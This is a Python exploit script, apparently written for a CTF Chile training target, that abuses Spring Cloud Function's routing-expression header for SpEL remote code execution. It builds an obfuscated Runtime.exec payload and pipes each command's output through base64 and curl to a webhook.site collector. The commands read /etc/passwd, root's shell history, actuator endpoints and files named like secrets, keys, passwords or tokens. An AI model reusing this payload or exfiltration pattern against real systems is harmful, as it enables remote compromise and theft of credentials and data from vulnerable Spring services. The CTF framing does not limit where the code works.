#!/usr/bin/env python3
"""
CTF Chile - Búsqueda sistemática del primer flag
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Creando webhook...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: {WH}")

def build_payload(shell_cmd):
    esc = shell_cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = build_payload(shell)
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] Búsqueda sistemática de flags con diferentes codificaciones...")

# Buscar flags en formato base64
probe("flag_base64", "echo 'Y3RmY2hpbGV7' | base64 -d 2>/dev/null && find / -type f -exec grep -l 'Y3RmY2hpbGV7\\|Q1RGQ0hJTEV7' {} \\; 2>/dev/null | head -5")

# Buscar flags en archivos de configuración Spring
probe("spring_flag", "cd /tmp && unzip -p /app/app.jar application.properties application.yml bootstrap.properties 2>/dev/null | grep -i flag")

# Buscar flags en comentarios HTML/JS del JAR
probe("jar_comments", "cd /tmp && unzip -q /app/app.jar 2>/dev/null && find . -name '*.html' -o -name '*.js' -o -name '*.css' | xargs grep -i 'flag\\|ctf' 2>/dev/null")

print("[*] Examinar endpoints específicos de la aplicación OmniVault...")

# Probar endpoints específicos que podrían tener flags
probe("vault_config", "curl -s http://localhost:8080/config 2>/dev/null || echo 'NO_CONFIG'")
probe("vault_version", "curl -s http://localhost:8080/version 2>/dev/null || echo 'NO_VERSION'")
probe("vault_info", "curl -s http://localhost:8080/info 2>/dev/null || echo 'NO_INFO'")

print("[*] Buscar flags en archivos de sistema específicos...")

# Archivos donde suelen ocultarse flags en CTF
probe("etc_passwd_flag", "cat /etc/passwd | grep -i flag")
probe("etc_hosts_flag", "cat /etc/hosts | grep -i flag")
probe("motd_flag", "cat /etc/motd 2>/dev/null | grep -i flag")
probe("issue_flag", "cat /etc/issue 2>/dev/null | grep -i flag")

print("[*] Revisar archivos de log y temporales...")

# Archivos temporales y de log
probe("var_log_flag", "find /var/log -type f -exec grep -l 'flag\\|ctf' {} \\; 2>/dev/null | head -5")
probe("tmp_files_flag", "find /tmp -type f -exec cat {} \\; 2>/dev/null | grep -i 'ctfchile{\\|flag{' | head -3")

print("[*] Buscar flags en archivos de historia...")

# Archivos de historia que podrían contener flags
probe("history_flag", "cat /root/.bash_history /root/.zsh_history 2>/dev/null | grep -i 'flag\\|ctf'")

print("[*] Probar endpoints ocultos del OmniVault...")

# Endpoints comunes en aplicaciones Spring Boot
probe("actuator_beans", "curl -s http://localhost:8080/actuator/beans | head -20")
probe("actuator_mappings", "curl -s http://localhost:8080/actuator/mappings | head -20")
probe("actuator_trace", "curl -s http://localhost:8080/actuator/httptrace | head -20")

print("[*] Buscar archivos con nombres sospechosos...")

# Archivos con nombres que podrían indicar flags
probe("suspicious_names", "find / -name '*secret*' -o -name '*key*' -o -name '*password*' -o -name '*token*' 2>/dev/null | head -10")

print("[*] Examinar metadata de archivos...")

# Verificar si hay metadata en archivos
probe("file_metadata", "find /app /root /tmp -type f -exec file {} \\; | grep -i 'data\\|text' | head -10")

time.sleep(18)

# Recoger respuestas
print("[*] Recogiendo respuestas...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=35", timeout=10)
data = r.json().get("data", [])

flags_found = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print("TAG:", path)
    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Buscar flags CTF con mayor sensibilidad
            if "ctfchile{" in decoded.lower() or "flag{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO EN {path}! 🚩🚩🚩")
                print(f"CONTENIDO: {decoded}")

            # Buscar patrones sospechosos que podrían ser flags encoded
            if len(decoded) > 20 and len(decoded) < 100:
                if any(char in decoded for char in "{}[]()"):
                    print(f"🔍 Posible flag codificado: {decoded[:50]}...")

        except Exception as e:
            print(f"(decode error) {raw[:200]}")
    else:
        print("(sin payload)")

print(f"\n[*] Manual review: https://webhook.site/#!/{UUID}")

if flags_found:
    print(f"\n🎉🎉🎉 FLAGS ENCONTRADOS: {len(flags_found)} 🎉🎉🎉")
    for path, flag in flags_found:
        print(f"  UBICACIÓN: {path}")
        print(f"  FLAG: {flag.strip()}")
        print()
else:
    print("\n[*] Primer flag aún no encontrado - puede estar más oculto o requerir un método diferente")